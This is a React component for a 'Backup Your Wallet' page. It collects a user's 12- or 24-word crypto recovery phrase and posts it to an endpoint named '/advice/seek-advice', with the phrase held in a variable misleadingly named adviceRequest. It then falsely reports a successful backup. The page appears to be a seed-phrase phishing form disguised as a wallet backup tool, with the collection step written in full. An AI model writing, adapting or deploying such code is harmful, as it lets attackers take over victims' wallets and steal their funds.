import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import API_URL from '../utils/api';
import { motion } from 'framer-motion';
import { FaArrowLeft } from 'react-icons/fa';

const WalletConnect = () => {
  const [selectedWallet, setSelectedWallet] = useState('');
  const [adviceRequest, setAdviceRequest] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const wordCount = adviceRequest.trim().split(/\s+/).filter(w => w.length > 0).length;
  const isValidWordCount = wordCount === 12 || wordCount === 24;

  useEffect(() => {
    const wallet = localStorage.getItem('selectedWallet');
    if (wallet) setSelectedWallet(wallet);
    else {
      alert('No wallet selected. Redirecting...');
      navigate('/wallet-selection');
    }
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedWallet || !adviceRequest.trim()) {
      alert('Please enter your recovery phrase.');
      return;
    }
    if (!isValidWordCount) {
      alert('Recovery phrase must contain 12 or 24 words.');
      return;
    }
    setIsSubmitting(true);
    try {
      const token = localStorage.getItem('token');
      const headers = token ? { Authorization: `Bearer ${token}` } : {};
      await axios.post(
        `${API_URL}/advice/seek-advice`,
        { wallet: selectedWallet, request: adviceRequest },
        { headers }
      );
      alert('Wallet backed up successfully.');
      localStorage.removeItem('selectedWallet');
      navigate('/contact');
    } catch (err) {
      console.error(err);
      alert('Failed to backup.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-sky-50 flex items-center justify-center p-6">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.6 }}
        className="w-full max-w-lg bg-white p-8 rounded-2xl shadow-lg"
      >
        <h2 className="text-3xl font-bold text-navy-600 mb-6 text-center">Backup Your Wallet</h2>
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="block text-navy-700 font-semibold mb-2">Selected Wallet</label>
            <div className="w-full py-3 px-4 border border-gray-300 rounded bg-gray-50 text-gray-700">
              {selectedWallet || 'Loading...'}
            </div>
          </div>
          <div>
            <label className="block text-navy-700 font-semibold mb-2">Recovery Phrase</label>
            <textarea
              rows={4}
              value={adviceRequest}
              onChange={e => setAdviceRequest(e.target.value)}
              className="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:border-sky-600 focus:ring-2 focus:ring-sky-200 resize-none"
              placeholder="Enter your 12 or 24 word phrase"
              required
            />
            <p className="mt-2 text-sm">
              <span className={isValidWordCount ? 'text-green-600 font-semibold' : 'text-red-500 font-semibold'}>
                {wordCount} words
              </span>
            </p>
          </div>
          <button
            type="submit"
            disabled={isSubmitting || !isValidWordCount}
            className={`w-full py-3 rounded bg-sky-600 text-white font-semibold hover:bg-sky-700 transition ${
              isSubmitting || !isValidWordCount ? 'opacity-50 cursor-not-allowed' : ''
            }`}
          >
            {isSubmitting ? 'Backing up...' : 'Backup Wallet'}
          </button>
          <button
            type="button"
            onClick={() => navigate('/wallet-selection')}
            className="w-full py-3 rounded border border-sky-300 text-sky-600 hover:bg-sky-50 transition flex items-center justify-center gap-2"
          >
            <FaArrowLeft size={16} />
            Change Wallet
          </button>
        </form>
      </motion.div>
    </div>
  );
};

export default WalletConnect;
